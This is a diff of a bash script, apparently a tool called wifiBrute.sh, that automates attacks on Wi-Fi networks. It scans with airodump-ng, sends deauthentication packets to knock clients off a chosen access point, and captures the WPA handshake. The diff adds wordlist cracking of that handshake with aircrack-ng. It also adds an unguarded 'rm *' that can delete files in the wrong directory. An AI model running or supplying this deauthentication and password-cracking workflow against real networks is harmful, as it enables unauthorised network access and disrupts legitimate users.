@@ -19,20 +19,21 @@ user=$(who | cut -d ' ' -f1 | sort | uniq)
 interface=$(ip link show | awk -F': ' '/^[0-9]+: [a-zA-Z0-9]+:/ {name=$2} END {print name}')
 
 function banner () {
-    echo "                            
-       _ ___ _ _____         _       
- _ _ _|_|  _|_| __  |___ _ _| |_ ___ 
-| | | | |  _| | __ -|  _| | |  _| -_|
-|_____|_|_| |_|_____|_| |___|_| |___|                              
-Layvth@Github
-"
+    echo "                                  
+                      _ ___ _ _____         _       
+                _ _ _|_|  _|_| __  |___ _ _| |_ ___ 
+               | | | | |  _| | __ -|  _| | |  _| -_|
+               |_____|_|_| |_|_____|_| |___|_| |___|                              
+               Layvth@Github
+"       
 }
-#/////////////////////////////// airodump-ng running for get access AP //////////////
+#/////////////////////////////// airodump-ng running for get target AP //////////////
 
 
 run_airodump() {
     local interface=$1
     echo -e "${GREEN}[+]~: ${NC}Scanning for Wi-Fi networks on interface $interface..."
+    echo -e "${RED}[ ATTENTION }${NC} ${YELLOW}MAKE SHOUR WHEN YOU PRESS Ctrl + C YOU ARE IN XTERM TERMINAL NOT THE MAIN ONE ${NC}"
     echo -e "${YELLOW}[+]~: When you Finish Scaning Press [Ctrl + c]"
     xterm -geometry 100x50 -e "airodump-ng $interface --output-format csv -w outputfile"
     filter_info outputfile-01.csv
@@ -150,11 +151,34 @@ getHandshake () {
     local currentPath=$(pwd)
 
     echo "$currentPath"
+    
     echo "$bssid $channel $interfaceLocal"
     cd $currentPath/handshake
+    rm *
     sendDeauth "$bssid" "$interfaceLocal" &
     xterm -geometry 100x50 -e "airodump-ng -c $channel --bssid $bssid -w psk $interfaceLocal"
+    aircrack_start $currentPath/handshake/psk-01.cap $bssid
 }
+
+aircrack_start () {
+    local capfile=$1
+    local bssid=$2 
+    while true; do
+        read -p "> wordlist Path :> " path_wordlist
+        if [ -f "$path_wordlist" ]; then
+            xterm -geometry 100x650 -e "aircrack-ng -w $path_wordlist -b $bssid $capfile"
+            break
+        else
+            echo "[!] File doesn't not exist try Another Path"
+        fi
+    done
+
+}
+
+
+
+
+
 
 
 
@@ -171,20 +195,24 @@ check_monitor_mode_support() {
             echo -e "${GREEN}[+]~:${NC} You on ready in Monitro Mode !"
             checkTools
         else
-            read -p "    | Switch ($interface) to monitor mode (y/n) >  " response
-            if [ "$response" == "yes" ] || [ "$response" == "y" ]; then
-                sleep .7
+            echo -e "${GREEN}--------------------------------------------------------"
+            read -p "[*]~: Switch ($interface) to monitor mode (y/n) :   " input 
+            echo -e "--------------------------------------------------------${NC}"
+            if [ "$input" == "yes" ] || [ "$input" == "y" ]; then
+                sleep .3
                 airmon-ng start $interface >> /dev/null
-                sleep .5
+                sleep .3
                 echo -e "${GREEN}[*]~:${NC}$infterface Switched to monitor mode !"
                 sleep 1
                 checkTools
+            else 
+                echo -e "${RED}[!]~:${NC} Sorry ! we can not run this script without Monitor mode !"
             fi
         fi
         
     else
         echo -e "${RED}[!]~:${NC} Interface ($interface) does not support monitor mode"
-        sleep .7
+        sleep .3
         echo -e "${RED}[!]~:${NC} Error : check your interface !${NC}"
         
         exit 1
@@ -192,7 +220,7 @@ check_monitor_mode_support() {
 }
 
 ctrl_c () {
-    echo "exiting"
+    echo "Exiting"
     if iwconfig $interface | grep -q "Mode:Monitor"; then
         read -p "[*]~: Do you want to exit from Monitor mode (yes/no) : " check
         if [ "$check" == "yes" ] || [ "$check" == "y" ]; then
@@ -203,11 +231,11 @@ ctrl_c () {
             echo "[*]~: Exiting from monitor Mode !"
             exit 1
         else
-            echo "[*]~: Exit !"
+            echo -e "${YELLOW}[*]~: ${NC}Exit !"
             exit 1
         fi
     else
-        echo "[*]~: Exit !"
+        echo -e "${YELLOW}[*]~: ${NC}Exit !"
         exit 1
     fi
 }
@@ -217,8 +245,8 @@ trap ctrl_c SIGINT
 # check for root permetion
 checkRoot () { 
     if [ "$(id -u)" != "0" ]; then
-        echo "[!] We need root permition !"
-        echo "[+] Try run with [ sudo ./wifiBrute.sh ] "
+        echo "${RED}[!]${NC} We need root permition !"
+        echo "${YELLOW}[+]${NC} Try run with [ sudo ./wifiBrute.sh ] "
     else 
         clear
         banner
@@ -235,17 +263,17 @@ checkTools() {
         tool_path=$(which "$tool")
         if [ "$?" -ne "0" ]; then
             echo -e "${RED}[ Not Found ] ${NC}$toos"
-            echo "[!] try [ apt-get install $tool ] "
+            echo "${YELLOW}[!] ${NC}try [ apt-get install $tool ] "
         else 
             sleep 0.4
-            echo -e "${GREEN}[ Found ]~: ${NC}$tool"
+            echo -e "${BLUE}[+}${NC}$tool"
             ((tools_found+=1)) # Increment the counter if the tool is found
         fi
     done
     if [ "$tools_found" -eq "${#tools[@]}" ]; then
         run_airodump $interface
     else
-        echo -e "${RED}Some required tools were not found.${NC}"
+        echo -e "${RED}[!]~: Some required tools were not found.${NC}"
         exit 1
     fi
 }
